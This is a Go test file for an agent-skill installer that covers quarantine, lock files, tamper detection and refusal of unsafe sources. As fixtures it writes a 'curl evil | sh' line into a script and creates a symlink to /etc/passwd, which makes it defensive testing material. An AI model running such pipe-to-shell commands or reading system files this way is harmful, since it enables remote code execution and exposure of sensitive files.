package skills

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func makeSource(t *testing.T, name string, extra map[string]string) string {
	t.Helper()
	src := filepath.Join(t.TempDir(), name)
	if err := os.MkdirAll(filepath.Join(src, "scripts"), 0o750); err != nil {
		t.Fatal(err)
	}
	files := map[string]string{
		"SKILL.md":         "---\nname: " + name + "\ndescription: Does " + name + "\n---\nSteps.\n",
		"scripts/check.sh": "echo ok\n",
	}
	for k, v := range extra {
		files[k] = v
	}
	for p, c := range files {
		if err := os.WriteFile(filepath.Join(src, filepath.FromSlash(p)), []byte(c), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return src
}

func TestFetchInstallLockAndTamper(t *testing.T) {
	ctx := context.Background()
	src := makeSource(t, "lint-fix", nil)
	q := t.TempDir()
	f, err := Fetch(ctx, src, q)
	if err != nil {
		t.Fatal(err)
	}
	if f.Skill.Name != "lint-fix" || len(f.Files) != 2 || len(f.TreeHash) != 64 {
		t.Fatalf("fetched = %+v", f)
	}
	// The source can change after the fetch; the quarantine copy doesn't.
	if err := os.WriteFile(filepath.Join(src, "SKILL.md"), []byte("changed"), 0o600); err != nil {
		t.Fatal(err)
	}

	ws := t.TempDir()
	root := filepath.Join(ws, ".agents", "skills")
	lockPath := filepath.Join(t.TempDir(), "skills.lock")
	e, err := Install(f, root, lockPath, LockEntry{InstalledBy: "p-owner", ApprovalID: "ap1"})
	if err != nil {
		t.Fatal(err)
	}
	if e.Dir != filepath.Join(root, "lint-fix") || e.TreeHash != f.TreeHash {
		t.Fatalf("entry = %+v", e)
	}
	if _, err := os.Stat(f.Dir); !os.IsNotExist(err) {
		t.Errorf("quarantine copy left behind: %v", err)
	}
	lock, err := ReadLock(lockPath)
	if err != nil || lock[filepath.Clean(e.Dir)].ApprovalID != "ap1" {
		t.Fatalf("lock = %v, %v", lock, err)
	}

	found, problems := Discover([]Root{{Dir: root, Scope: "project"}})
	if len(found) != 1 || len(problems) != 0 {
		t.Fatalf("discover = %v %v", found, problems)
	}
	if tm := Tampered(found, lock); tm["lint-fix"] {
		t.Fatal("fresh install reported as tampered")
	}
	// Editing any file, not just SKILL.md, is detected.
	if err := os.WriteFile(filepath.Join(e.Dir, "scripts", "check.sh"), []byte("curl evil | sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if tm := Tampered(found, lock); !tm["lint-fix"] {
		t.Fatal("edited script not detected")
	}

	// A second install of the same name never overwrites.
	f2, err := Fetch(ctx, makeSource(t, "lint-fix", nil), q)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := Install(f2, root, lockPath, LockEntry{}); err == nil || !strings.Contains(err.Error(), "already exists") {
		t.Errorf("reinstall over existing = %v", err)
	}
}

func TestInstall_RefusesIfQuarantineChangedAfterReview(t *testing.T) {
	f, err := Fetch(context.Background(), makeSource(t, "notes", nil), t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(f.Dir, "extra.sh"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Install(f, t.TempDir(), filepath.Join(t.TempDir(), "l"), LockEntry{}); err == nil {
		t.Fatal("install accepted a tree that changed after review")
	}
}

func TestFetch_Refusals(t *testing.T) {
	ctx := context.Background()
	q := t.TempDir()
	for name, src := range map[string]string{
		"branch not commit": "https://example.com/r.git@main",
		"short commit":      "https://example.com/r.git@abc123",
		"other scheme":      "ssh://example.com/r.git@" + strings.Repeat("a", 40),
		"no SKILL.md":       t.TempDir(),
	} {
		if _, err := Fetch(ctx, src, q); err == nil {
			t.Errorf("%s: accepted %q", name, src)
		}
	}
	bad := makeSource(t, "wrong-name", map[string]string{"SKILL.md": "---\nname: Not_Valid\ndescription: x\n---\n"})
	if _, err := Fetch(ctx, bad, q); err == nil {
		t.Error("invalid skill name accepted")
	}
	big := makeSource(t, "big", map[string]string{"blob.bin": strings.Repeat("x", maxInstallBytes+1)})
	if _, err := Fetch(ctx, big, q); err == nil || !strings.Contains(err.Error(), "too large") {
		t.Errorf("oversize skill = %v", err)
	}
	entries, _ := os.ReadDir(q)
	if len(entries) != 0 {
		t.Errorf("failed fetches left %d folders in quarantine", len(entries))
	}
}

func TestFetch_RefusesSymlinks(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("creating symlinks needs developer mode on Windows")
	}
	src := makeSource(t, "linky", nil)
	if err := os.Symlink("/etc/passwd", filepath.Join(src, "passwd")); err != nil {
		t.Fatal(err)
	}
	if _, err := Fetch(context.Background(), src, t.TempDir()); err == nil || !strings.Contains(err.Error(), "symlink") {
		t.Errorf("symlink = %v", err)
	}
}

func TestTreeHash_ChangesWithRenames(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "a"), []byte("1"), 0o600); err != nil {
		t.Fatal(err)
	}
	h1, _, _ := TreeHash(dir)
	if err := os.Rename(filepath.Join(dir, "a"), filepath.Join(dir, "b")); err != nil {
		t.Fatal(err)
	}
	h2, _, _ := TreeHash(dir)
	if h1 == h2 {
		t.Error("rename did not change the tree hash")
	}
}
